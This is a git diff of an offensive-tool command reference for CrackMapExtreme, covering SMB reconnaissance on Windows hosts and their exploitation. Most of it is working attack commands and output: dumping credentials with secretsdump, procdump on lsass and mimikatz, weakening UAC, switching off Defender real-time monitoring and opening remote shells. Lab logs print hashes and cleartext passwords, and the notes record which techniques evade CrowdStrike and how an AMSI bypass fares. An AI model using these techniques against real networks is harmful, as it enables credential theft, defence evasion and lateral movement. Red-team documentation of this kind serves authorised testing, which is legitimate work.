@@ -4,14 +4,14 @@ title: Host Enum via SMB
 ---
 # SMB: Host Recon Reference
 Created by: @awsmhacks  
-Updated: 3/26/20  
+Updated: 4/3/20  
 CMX Version: 0.0.1.azdev1
 
 
 **Notes:**
 * The following examples assume you have a Kali/Windows host connected to an internal network.
 * If you are running from Kali, be sure to escape special chars i.e ($,!)
-* Dont trust the opsec safe just yet. Generally this applies to windows defender only, working on adding crowdstrike detections. 
+* OPsec_safe results are from testing against crowdstrike on 4/3/2020. 
 
 Host-Based Recon Sections  
   
@@ -23,22 +23,36 @@ Host-Based Recon Sections
 6. [Shares and access](#enumerate-shares-and-access)
 7. [Full Host Recon -- runs all the above recon commands in one go](#full-host-recon)
 8. [Spidering Shares and Disks](#spidering-shares-and-disks)
-9. [Getting Creds via Secretsdump](#extracting-credentials)
-10. [Getting Creds via procdump](#extracting-credentials)
-11. [Getting Creds via mimikatz](#extracting-credentials)
-
+9. [Retrieve Password Policy](#obtain-password-policy)
+10. [Getting Creds via Secretsdump](#extracting-credentials)
+11. [Getting Creds via procdump](#extracting-credentials)
+12. [Getting Creds via mimikatz](#extracting-credentials)
+13. [WMI Query Execution](#wmi-query-execution)
+14. [UAC Check/Modify](#uac)
+15. [Disable Defender](#kill-defender)
+16. [Check if host is dual-homed](#dual-homed)
+17. [Raw Command Execution](#command-execution)
+18. [Interactive Shells](#getting-shellular)  
 
 Need updates/Still need to document examples:  
-X. [WMI Query Execution](#wmi-query-execution)  
-X. [Retrieve Password Policy](#password-policy)  
-X. [UAC Check/Modify](#uac)  
+X. [Raw Powershell Command Execution](#command-execution)  
 X. [Services Checks](#service)  
 X. [Registry Checks](#registry)  
-X. [Check if host is dual-homed](#dualhomed)  
-X. [Disable Defender](#killdefender)  
-X. [Command Exec](#killdefender)  
-X. [Powershell Exec](#killdefender)  
-X. [Interactive Shells](#killdefender)  
+
+
+### Testing Against Crowdstrike Progress - 4.3.20
+-local users - pass  
+-logged on users - pass  
+-local sessions - pass  
+-local disks - pass  
+-shares - pass  
+-full recon - pass  
+-spider share - pass  
+-secretsdump - pass  
+-procdump - fail  -- and will break further coms - need to rework how it kills it  
+-mimikatz -- amsi bypass is failing now - fail  
+-interactive shells - wmi,at,dcom execmethods pass, smb+psexec are both caught.  
+-command execution - wmi,at,dcom execmethods pass, smb+psexec are both caught.  
 
 
 ------------------------------------------------------------------------
@@ -49,7 +63,7 @@ X. [Interactive Shells](#killdefender)
 |---------------+-------------+-------------+-------------+------------|
 | Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
 |---------------|-------------|-------------|-------------|------------|
-| true          | false       | false       | false       | true*      |
+| true          | false       | false       | false       | true       |
 |---------------+-------------+-------------+-------------+------------|
 {: .tablelines}
 
@@ -72,7 +86,7 @@ Mar.25.20 15:29:52  SMB      192.168.0.103  WIN7A      WIN7A\Guest           :50
 |---------------+-------------+-------------+-------------+------------|
 | Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
 |---------------|-------------|-------------|-------------|------------|
-| TRUE          | false       | false       | false       | TRUE*      |
+| TRUE          | false       | false       | false       | TRUE       |
 |---------------+-------------+-------------+-------------+------------|
 {: .tablelines}
 
@@ -110,7 +124,7 @@ Logged-on users are not the same as sessions!
 |---------------+-------------+-------------+-------------+------------|
 | Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
 |---------------|-------------|-------------|-------------|------------|
-| TRUE          | false       | TRUE        | false       | TRUE*      |
+| TRUE          | false       | TRUE        | false       | TRUE       |
 |---------------+-------------+-------------+-------------+------------|
 {: .tablelines}
 
@@ -146,7 +160,7 @@ Sessions are not the same as logged-on users!
 |---------------+-------------+-------------+-------------+------------|
 | Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
 |---------------|-------------|-------------|-------------|------------|
-| TRUE          | false       | false       | false       | TRUE*      |
+| TRUE          | false       | false       | false       | TRUE       |
 |---------------+-------------+-------------+-------------+------------|
 {: .tablelines}
 
@@ -178,7 +192,7 @@ Mar.25.20 16:24:07  SMB      192.168.0.103  WIN7A      arianna has session origi
 |---------------+-------------+-------------+-------------+------------|
 | Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
 |---------------|-------------|-------------|-------------|------------|
-| TRUE          | false       | false       | false       | TRUE*      |
+| TRUE          | false       | false       | false       | TRUE       |
 |---------------+-------------+-------------+-------------+------------|
 {: .tablelines}
 
@@ -213,7 +227,7 @@ Mar.25.20 16:31:53  SMB      192.168.0.103  WIN7A      WIN7A\agrande
 |---------------+-------------+-------------+-------------+------------|
 | Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
 |---------------|-------------|-------------|-------------|------------|
-| TRUE          | false       | TRUE        | false       | TRUE*      |
+| TRUE          | false       | TRUE        | false       | TRUE       |
 |---------------+-------------+-------------+-------------+------------|
 {: .tablelines}
 
@@ -250,7 +264,7 @@ Attempts to authenticate to the target(s) and enumerate share access.
 |---------------+-------------+-------------+-------------+------------|
 | Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
 |---------------|-------------|-------------|-------------|------------|
-| TRUE          | false       | false       | false       | TRUE*      |
+| TRUE          | false       | false       | false       | TRUE       |
 |---------------+-------------+-------------+-------------+------------|
 {: .tablelines}
 
@@ -299,7 +313,7 @@ Mar.25.20 16:28:41  SMB      192.168.0.103  WIN7A      IPC$                     
 |---------------+-------------+-------------+-------------+------------|
 | Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
 |---------------|-------------|-------------|-------------|------------|
-| TRUE          | false       | false       | false       | TRUE*      |
+| TRUE          | false       | false       | false       | TRUE       |
 |---------------+-------------+-------------+-------------+------------|
 {: .tablelines}
 
@@ -388,7 +402,7 @@ PS C:\Users\rywpr4\Documents\GitHub\CrackMapExtreme>
 |---------------+-------------+-------------+-------------+------------|
 | Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
 |---------------|-------------|-------------|-------------|------------|
-| TRUE          | false       | false*      | false       | TRUE*      |
+| TRUE          | false       | false*      | false       | TRUE       |
 |---------------+-------------+-------------+-------------+------------|
 {: .tablelines}
 
@@ -432,6 +446,39 @@ Mar.25.20 16:37:08  SMB      192.168.0.103  WIN7A      //192.168.0.103/C$/Progra
 
 
 
+------------------------------------------------------------------------
+# Obtain password policy
+
+|---------------+-------------+-------------+-------------+------------|
+| Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
+|---------------|-------------|-------------|-------------|------------|
+| TRUE          | false       | false*      | false       | TRUE       |
+|---------------+-------------+-------------+-------------+------------|
+{: .tablelines
+
+
+### Command Syntax  
+`cmx smb TARGET -u Username -p Pass --pass-pol`
+
+```
+# cmx smb 192.168.0.150 -u IEUser -p Passw0rd\! --local-auth --pass-pol
+Apr.03.20 15:08:20  SMB      192.168.0.150 WIN10TEST  [*] Windows 10.0 Build 17763 x64 (domain:WIN10TEST) (signing:False) (SMBv:3.0)
+Apr.03.20 15:08:20  SMB      192.168.0.150 WIN10TEST  [+] WIN10TEST\IEUser:Passw0rd! (Pwn3d!)
+Apr.03.20 15:08:20  SMB      192.168.0.150 WIN10TEST  [+] Dumping password info for Host: WIN10TEST
+Apr.03.20 15:08:20  SMB      192.168.0.150 WIN10TEST     Minimum password length: None
+Apr.03.20 15:08:20  SMB      192.168.0.150 WIN10TEST     Password history length: None
+Apr.03.20 15:08:20  SMB      192.168.0.150 WIN10TEST     Maximum password age:
+Apr.03.20 15:08:20  SMB      192.168.0.150 WIN10TEST     Minimum password age: None
+Apr.03.20 15:08:20  SMB      192.168.0.150 WIN10TEST     Reset Account Lockout Counter: 30 minutes
+Apr.03.20 15:08:20  SMB      192.168.0.150 WIN10TEST     Locked Account Duration: 30 minutes
+Apr.03.20 15:08:20  SMB      192.168.0.150 WIN10TEST     Account Lockout Threshold: None
+Apr.03.20 15:08:20  SMB      192.168.0.150 WIN10TEST     Forced Log off Time: Not Set
+
+```
+
+
+
+
 
 
 
@@ -448,7 +495,7 @@ Exact location is mentioned after the command.
 |---------------+-------------+-------------+-------------+------------|
 | Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
 |---------------|-------------|-------------|-------------|------------|
-| TRUE          | false       | TRUE        | false       | TRUE*      |
+| TRUE          | false       | TRUE        | false       | TRUE       |
 |---------------+-------------+-------------+-------------+------------|
 {: .tablelines}
 
@@ -474,7 +521,7 @@ Mar.25.20 16:49:36  SMB      192.168.0.103  WIN7A   [+] Saved 3 hashes to ~\.cmx
 |---------------+-------------+-------------+-------------+------------|
 | Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
 |---------------|-------------|-------------|-------------|------------|
-| TRUE          | false       | TRUE        | false       | TRUE*      |
+| TRUE          | false       | TRUE        | false       | TRUE       |
 |---------------+-------------+-------------+-------------+------------|
 {: .tablelines}
 
@@ -508,9 +555,12 @@ CMX transfers procdump64.exe to the host, dumps lsass.exe, pulls the dump back (
 |---------------+-------------+-------------+-------------+------------|
 | Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
 |---------------|-------------|-------------|-------------|------------|
-| TRUE          | false       | TRUE        | false       | TRUE*      |
+| TRUE          | false       | TRUE        | false       | False*     |
 |---------------+-------------+-------------+-------------+------------|
 {: .tablelines}
+Crowdstrike detects this, however, windows defender doesnt.
+
+
 
 ### Command Syntax  
 `cmx smb TARGET -u Username -p Pass --dump`
@@ -541,9 +591,13 @@ Mar.25.20 19:21:37  SMB      192.168.0.103  WIN7A       SWAMP\arianna:bbc2bf2fbc
 | TRUE          | false       | TRUE        | false       | false*     |
 |---------------+-------------+-------------+-------------+------------|
 {: .tablelines}
+Crowdstrike catches this.
 
-\* Note: Windows Defender might catch this, so be sure to add the -kd switch if you think defender is running.  
+\* Note: Windows Defender might catch this (depends on host OS version), so be sure to add the -kd switch if you think defender is running.  
 -kd = kill defender
+
+\* Note: as of april/3/2020 the powershell amsi bypass is getting caught by defender on up-to-date win10
+Killing defender will still work but may throw an alert to the end user when the amsi bypass fails. 
 
 ### Command Syntax  
 `cmx smb TARGET -u Username -p Pass -kd -M mimikatz`
@@ -563,47 +617,365 @@ Mar.25.20 19:19:19  MIMIK...    192.168.0.103        Saved raw Mimikatz output t
 ```
 
 
-.
-.
-
-.
-
-.
-
-.
-
-.
-
-.
-
-.
-
-.
-
-.
 
 
-Need to update command ref
+
+
+
+
+
 ------------------------------------------------------------------------
-# Obtain password policy
+# WMI Query Execution
 
+
+|---------------+-------------+-------------+-------------+------------|
 | Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
 |---------------|-------------|-------------|-------------|------------|
-| true          | false       | false       | false       | true*      |
+| TRUE          | false       | false       | false       | true       |
+|---------------+-------------+-------------+-------------+------------|
+{: .tablelines}
+
+### Command Syntax  
+`cmx smb TARGET -u Username -p Pass --wmi "QUERY"`
+`cmx smb TARGET -u Username -p Pass --wmi "SELECT * FROM Win32_logicalDisk WHERE DeviceID = 'C:'"`
 
 ```
-#~ cmx smb 10.10.33.122 -u agrande -p User\!23 --pass-pol
+# cmx smb 192.168.0.150 -u IEUser -p Passw0rd\! --local-auth --wmi "SELECT * FROM Win32_logicalDisk WHERE DeviceID = 'C:'"
+Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST [*] Windows 10.0 Build 17763 x64 (domain:WIN10TEST) (signing:False) (SMBv:3.0)
+Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST [+] WIN10TEST\IEUser:Passw0rd! (Pwn3d!)
+Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST [*] Executing query:"SELECT * FROM Win32_logicalDisk WHERE DeviceID = 'C:'" over wmi...
+Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    Caption => C:
+Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    Description => Local Fixed Disk
+Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    InstallDate => None
+Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    Name => C:
+Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    Status => None
+Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    Availability => 65535
+Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    CreationClassName => Win32_LogicalDisk
+Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    ConfigManagerErrorCode => None
+Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    ConfigManagerUserConfig => True
+Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    DeviceID => C:
+Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    PowerManagementCapabilities => None
+Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    PNPDeviceID => None
+Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    PowerManagementSupported => True
+Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    StatusInfo => 65535
+Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    SystemCreationClassName => Win32_ComputerSystem
+Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    SystemName => WIN10TEST
+Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    LastErrorCode => None
+Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    ErrorDescription => None
+Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    ErrorCleared => True
+Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    Access => 65535
+Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    BlockSize => 18446744073709551615
+Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    ErrorMethodology => None
+Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    NumberOfBlocks => 18446744073709551615
+Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    Purpose => None
+Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    FreeSpace => 21780078592
+Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    Size => 42947571712
+Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    Compressed => None
+Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    DriveType => 3
+Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    FileSystem => NTFS
+Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    MaximumComponentLength => 255
+Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    ProviderName => None
+Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    SupportsFileBasedCompression => True
+Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    VolumeName => Windows 10
+Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    VolumeSerialNumber => B009E7A9
+Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    MediaType => 12
+Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    SupportsDiskQuotas => True
+Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    QuotasDisabled => True
+Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    QuotasIncomplete => None
+Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    QuotasRebuilding => None
+Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST    VolumeDirty => None
+Apr.03.20 15:28:34  SMB      192.168.0.150 WIN10TEST
+```
 
-Sep.02.19 14:04:40  SMB         10.10.33.122  SERVER2012-2 [*] Windows Server 2012 R2 Datacenter 9600 x64 (domain:OCEAN) (signing:False) (SMBv:1)
-Sep.02.19 14:04:40  SMB         10.10.33.122  SERVER2012-2 [+] OCEAN\agrande:User!23 
-Sep.02.19 14:04:40  SMB         10.10.33.122  SERVER2012-2 [+] Dumping password info for domain: OCEAN
-Sep.02.19 14:04:40  SMB         10.10.33.122  SERVER2012-2 Minimum password length: 7
-Sep.02.19 14:04:40  SMB         10.10.33.122  SERVER2012-2 Password history length: 24
-Sep.02.19 14:04:40  SMB         10.10.33.122  SERVER2012-2 Maximum password age: 
-Sep.02.19 14:04:40  SMB         10.10.33.122  SERVER2012-2 Minimum password age: 
-Sep.02.19 14:04:40  SMB         10.10.33.122  SERVER2012-2 Reset Account Lockout Counter: 30 minutes 
-Sep.02.19 14:04:40  SMB         10.10.33.122  SERVER2012-2 Locked Account Duration: 30 minutes 
-Sep.02.19 14:04:40  SMB         10.10.33.122  SERVER2012-2 Account Lockout Threshold: 3
-Sep.02.19 14:04:40  SMB         10.10.33.122  SERVER2012-2 Forced Log off Time: Not Set
 
+
+
+
+
+------------------------------------------------------------------------
+# UAC
+
+
+|---------------+-------------+-------------+-------------+------------|
+| Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
+|---------------|-------------|-------------|-------------|------------|
+| TRUE          | false       | false       | false       | true       |
+|---------------+-------------+-------------+-------------+------------|
+{: .tablelines}
+
+### Check UAC Status  
+This queries for several registry keys, applies logic based on results, informs you of current UAC scenario.
+
+### Command Syntax  
+`cmx smb TARGET -u Username -p Pass -uac-status`
+
+```
+# cmx smb 192.168.0.150 -u IEUser -p Passw0rd\! --local-auth -uac-status
+Apr.03.20 15:33:51  SMB      192.168.0.150 WIN10TEST [*] Windows 10.0 Build 17763 x64 (domain:WIN10TEST) (signing:False) (SMBv:3.0)
+Apr.03.20 15:33:51  SMB      192.168.0.150 WIN10TEST [+] WIN10TEST\IEUser:Passw0rd! (Pwn3d!)
+Apr.03.20 15:33:52  SMB      192.168.0.150 WIN10TEST    UAC Status:
+Apr.03.20 15:33:52  SMB      192.168.0.150 WIN10TEST        enableLua = 1  (default)
+Apr.03.20 15:33:52  SMB      192.168.0.150 WIN10TEST        LocalAccountTokenFilterPolicy = 1
+Apr.03.20 15:33:52  SMB      192.168.0.150 WIN10TEST        FilterAdministratorToken key does not exist!
+Apr.03.20 15:33:52  SMB      192.168.0.150 WIN10TEST
+Apr.03.20 15:33:52  SMB      192.168.0.150 WIN10TEST    UAC Analysis:
+Apr.03.20 15:33:52  SMB      192.168.0.150 WIN10TEST    EnableLUA current setting means capabilities are determined by
+Apr.03.20 15:33:52  SMB      192.168.0.150 WIN10TEST             LocalAccountTokenFilterPolicy and/or FilterAdministratorToken
+Apr.03.20 15:33:52  SMB      192.168.0.150 WIN10TEST
+Apr.03.20 15:33:52  SMB      192.168.0.150 WIN10TEST    LocalAccountTokenFilterPolicy configured to allow remote connections with high integrity access tokens!
+```
+
+
+### Fix UAC
+
+|---------------+-------------+-------------+-------------+------------|
+| Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
+|---------------|-------------|-------------|-------------|------------|
+| TRUE          | false       | true        | false       | true       |
+|---------------+-------------+-------------+-------------+------------|
+{: .tablelines}
+
+This modifies registry keys pertaining to UAC.
+
+### Command Syntax  
+`cmx smb TARGET -u Username -p Pass -fix-uac`
+
+```
+# cmx smb 192.168.0.150 -u IEUser -p Passw0rd\! --local-auth -fix-uac
+Apr.03.20 15:36:38  SMB      192.168.0.150 WIN10TEST [*] Windows 10.0 Build 17763 x64 (domain:WIN10TEST) (signing:False) (SMBv:3.0)
+Apr.03.20 15:36:38  SMB      192.168.0.150 WIN10TEST [+] WIN10TEST\IEUser:Passw0rd! (Pwn3d!)
+Apr.03.20 15:36:39  SMB      192.168.0.150 WIN10TEST    EnableLUA Key Set!
+Apr.03.20 15:36:39  SMB      192.168.0.150 WIN10TEST    LocalAccountTokenFilterPolicy Key Set!
+```
+after the change, getting status
+```
+# cmx smb 192.168.0.150 -u IEUser -p Passw0rd\! --local-auth -uac-status
+Apr.03.20 15:37:10  SMB      192.168.0.150 WIN10TEST [*] Windows 10.0 Build 17763 x64 (domain:WIN10TEST) (signing:False) (SMBv:3.0)
+Apr.03.20 15:37:10  SMB      192.168.0.150 WIN10TEST [+] WIN10TEST\IEUser:Passw0rd! (Pwn3d!)
+Apr.03.20 15:37:12  SMB      192.168.0.150 WIN10TEST    UAC Status:
+Apr.03.20 15:37:12  SMB      192.168.0.150 WIN10TEST        enableLua = 0
+Apr.03.20 15:37:12  SMB      192.168.0.150 WIN10TEST        LocalAccountTokenFilterPolicy = 1
+Apr.03.20 15:37:12  SMB      192.168.0.150 WIN10TEST        FilterAdministratorToken key does not exist!
+Apr.03.20 15:37:12  SMB      192.168.0.150 WIN10TEST
+Apr.03.20 15:37:12  SMB      192.168.0.150 WIN10TEST    UAC Analysis:
+Apr.03.20 15:37:12  SMB      192.168.0.150 WIN10TEST    High integrity access available to any member of the local admins group
+Apr.03.20 15:37:12  SMB      192.168.0.150 WIN10TEST               using plaintext credentials or password hashes!
+```
+
+
+
+------------------------------------------------------------------------
+# Kill Defender
+
+
+|---------------+-------------+-------------+-------------+------------|
+| Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
+|---------------|-------------|-------------|-------------|------------|
+| TRUE          | false       | true        | false       | false*     |
+|---------------+-------------+-------------+-------------+------------|
+{: .tablelines}
+
+This executes `Set-MpPreference -DisableRealtimeMonitoring $true` to turn off real-time monitoring.
+This switch is designed to be used in combination with other execution modules.
+
+### Command Syntax  
+`cmx smb TARGET -u Username -p Pass -kd <command>`
+
+```
+# cmx smb 192.168.0.103 -u eminem -p Admin\!23 -kd -M mimikatz
+Mar.25.20 19:19:00  SMB      192.168.0.103  WIN7A   [*] Windows 6.1 Build 7601 x64 (domain:SWAMP) (signing:False) (SMBv:2.1)
+Mar.25.20 19:19:00  SMB      192.168.0.103  WIN7A   [+] SWAMP\eminem:Admin!23 (Pwn3d!)
+            [!] Sleeping to allow defender process to finish shutting down[!] 
+Mar.25.20 19:19:10  MIMIK...    192.168.0.103        - - "GET /Invoke-Mimikatz.ps1 HTTP/1.1" 200 -
+Mar.25.20 19:19:19  MIMIK...    192.168.0.103        - - "POST / HTTP/1.1" 200 -
+Mar.25.20 19:19:19  MIMIK...    192.168.0.103           swamp.local\arianna:bbc2bf2fbca9dd9ed74d3c1b55e3d727
+Mar.25.20 19:19:19  MIMIK...    192.168.0.103           swamp.local\WIN7A$:42d8cf1444bb879485532fea86c9e53e
+Mar.25.20 19:19:19  MIMIK...    192.168.0.103           swamp.local\arianna:User!23
+Mar.25.20 19:19:19  MIMIK...    192.168.0.103        [+] Added 3 credential(s) to the database
+Mar.25.20 19:19:19  MIMIK...    192.168.0.103        Saved raw Mimikatz output to /root/.cmx/logs/Mimikatz_against_192.168.0.103_on_Mar.25.20_at_1919.log
+```
+
+
+
+
+
+
+------------------------------------------------------------------------
+# Dual Homed
+
+|---------------+-------------+-------------+-------------+------------|
+| Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
+|---------------|-------------|-------------|-------------|------------|
+| TRUE          | false       | true        | false       | true       |
+|---------------+-------------+-------------+-------------+------------|
+{: .tablelines}
+
+This module checks the nic's on a host to try and identify hosts that are dual homed. 
+
+### Command Syntax  
+`cmx smb TARGET -u Username -p Pass --dualhome`
+
+```
+# cmx smb 192.168.0.150 -u IEUser -p Passw0rd\! --dualhome
+Apr.03.20 16:13:23  SMB      192.168.0.150 WIN10TEST [*] Windows 10.0 Build 17763 x64 (domain:WIN10TEST) (signing:False) (SMBv:3.0)
+Apr.03.20 16:13:23  SMB      192.168.0.150 WIN10TEST [+] WIN10TEST\IEUser:Passw0rd! (Pwn3d!)
+Apr.03.20 16:13:23  SMB      192.168.0.150 WIN10TEST    DNSDomainSuffixSearchOrder => []
+Apr.03.20 16:13:23  SMB      192.168.0.150 WIN10TEST    IPAddress => ['192.168.0.150', 'fe80::a4d5:c938:3395:a8b4']
+Apr.03.20 16:13:23  SMB      192.168.0.150 WIN10TEST
+```
+
+
+
+
+
+
+
+
+
+------------------------------------------------------------------------
+# Command Execution
+
+|---------------+-------------+-------------+-------------+------------|
+| Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
+|---------------|-------------|-------------|-------------|------------|
+| TRUE          | false       | true        | false       | false*     |
+|---------------+-------------+-------------+-------------+------------|
+{: .tablelines}
+
+smbexec and psexec will get caught by crowdstrike.  smbexec will hardfail, psexec will still return results.
+All others were not detected by crowdstrike or defender!  
+
+
+Commands execute as the user or as SYSTEM.  
+The exec-method will change the context of the command execution.  
+Based on the exec-method, commands may or may not have the correct session context to contact the domain controller to perform domain/network requests.
+Default execution method is WMIEXEC.  
+
+Context table:
+
+|---------------+-------------+---------------|
+| Method        | Context     | Domain Access |
+|---------------|-------------|---------------|
+| wmiexec       | USER        | false         |
+|---------------|-------------|---------------|
+| dcomexec      | USER        | false         |
+|---------------|-------------|---------------|
+| psexec        | SYSTEM      | TRUE          |
+|---------------|-------------|---------------|
+| smbexec       | SYSTEM      | TRUE          |
+|---------------|-------------|---------------|
+| atexec        | SYSTEM      | TRUE          |
+|---------------+-------------+---------------|
+{: .tablelines}
+
+
+### Command Syntax  
+`cmx smb TARGET -u Username -p Pass [--exec-method <method>] -x <command>`
+
+```
+# cmx smb 192.168.0.150 -u IEUser -p Passw0rd\! -x whoami
+Apr.03.20 15:45:47  SMB      192.168.0.150 WIN10TEST [*] Windows 10.0 Build 17763 x64 (domain:WIN10TEST) (signing:False) (SMBv:3.0)
+Apr.03.20 15:45:47  SMB      192.168.0.150 WIN10TEST [+] WIN10TEST\IEUser:Passw0rd! (Pwn3d!)
+Apr.03.20 15:45:47  SMB      192.168.0.150 WIN10TEST [*] Executed command via wmiexec
+Apr.03.20 15:45:48  SMB      192.168.0.150 WIN10TEST [+] Execution Completed.
+Apr.03.20 15:45:48  SMB      192.168.0.150 WIN10TEST [+] Results:
+Apr.03.20 15:45:48  SMB      192.168.0.150 WIN10TEST    win10test\ieuser
+```
+
+```
+# cmx smb 192.168.0.150 -u IEUser -p Passw0rd\! --exec-method atexec -x whoami
+Apr.03.20 15:48:52  SMB      192.168.0.150 WIN10TEST [*] Windows 10.0 Build 17763 x64 (domain:WIN10TEST) (signing:False) (SMBv:3.0)
+Apr.03.20 15:48:52  SMB      192.168.0.150 WIN10TEST [+] WIN10TEST\IEUser:Passw0rd! (Pwn3d!)
+Apr.03.20 15:48:52  SMB      192.168.0.150 WIN10TEST [*] Executed command via atexec
+Apr.03.20 15:48:55  SMB      192.168.0.150 WIN10TEST [+] Execution Completed.
+Apr.03.20 15:48:55  SMB      192.168.0.150 WIN10TEST [+] Results:
+Apr.03.20 15:48:55  SMB      192.168.0.150 WIN10TEST    b'nt authority\\system'
+```
+
+
+
+
+
+
+
+------------------------------------------------------------------------
+# Getting Shellular
+
+|---------------+-------------+-------------+-------------+------------|
+| Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
+|---------------|-------------|-------------|-------------|------------|
+| TRUE          | false       | true        | false       | true*      |
+|---------------+-------------+-------------+-------------+------------|
+{: .tablelines}
+
+smbexec and psexec will get caught by crowdstrike.
+
+
+Context table:
+
+|---------------+-------------+---------------|
+| Method        | Context     | Domain Access |
+|---------------|-------------|---------------|
+| wmiexec       | USER        | false         |
+|---------------|-------------|---------------|
+| dcomexec      | USER        | false         |
+|---------------|-------------|---------------|
+| psexec        | not-working | not-working   |
+|---------------|-------------|---------------|
+| smbexec       | SYSTEM      | TRUE          |
+|---------------|-------------|---------------|
+| atexec        | not-working | not-working   |
+|---------------+-------------+---------------|
+{: .tablelines}
+
+
+### Command Syntax  
+`cmx smb TARGET -u Username -p Pass [--exec-method <method>] -i`
+
+Default exec-method is wmi
+```
+# cmx smb 192.168.0.150 -u IEUser -p Passw0rd\! -i
+Apr.03.20 16:18:14  SMB      192.168.0.150 WIN10TEST [*] Windows 10.0 Build 17763 x64 (domain:WIN10TEST) (signing:False) (SMBv:3.0)
+Apr.03.20 16:18:14  SMB      192.168.0.150 WIN10TEST [+] WIN10TEST\IEUser:Passw0rd! (Pwn3d!)
+Apr.03.20 16:18:14  SMB      192.168.0.150 WIN10TEST [*] Bout to get shellular
+   .... i'm in
+ Type help for extra shell commands
+C:\>whoami
+win10test\ieuser
+
+C:\>hostname
+WIN10TEST
+
+C:\>exit
+```
+
+SMBexec provides a domain context
+```
+# cmx smb 192.168.0.105 -u eminem -p Admin\!23 --exec-method smbexec -i
+Apr.03.20 16:35:12  SMB      192.168.0.105 SERVER2019A [*] Windows 10.0 Build 17763 x64 (domain:SWAMP) (signing:False) (SMBv:3.0)
+Apr.03.20 16:35:12  SMB      192.168.0.105 SERVER2019A [+] SWAMP\eminem:Admin!23 (Pwn3d!)
+Apr.03.20 16:35:12  SMB      192.168.0.105 SERVER2019A [*] Bout to get shellular
+   .... i'm in
+
+C:\Windows\system32>net user /domain
+The request will be processed at a domain controller for domain swamp.local.
+
+
+User accounts for \\dc2012a.swamp.local
+
+-------------------------------------------------------------------------------
+392648SA                 572543SA                 Administrator
+ALANA_WATSON             AMY_KEY                  ANNA_FITZGERALD
+arianna                  BEAU_CALDERON            BETTYE_KAUFMAN
+BRITTNEY_FERNANDEZ       DINA_POTTER              drake
+eminem                   GINO_FLYNN               gucci
+Guest                    JO_COOKE                 joyner
+krbtgt                   MARVA_ONEILL             NADIA_BRADFORD
+NELDA_BARRETT            OLEN_ROSS                PHILIP_BARRETT
+TERRELL_WIGGINS          TONIA_BRADY              wayne
+YESENIA_CARLSON
+The command completed with one or more errors.
+
+
+C:\Windows\system32>exit
 ```
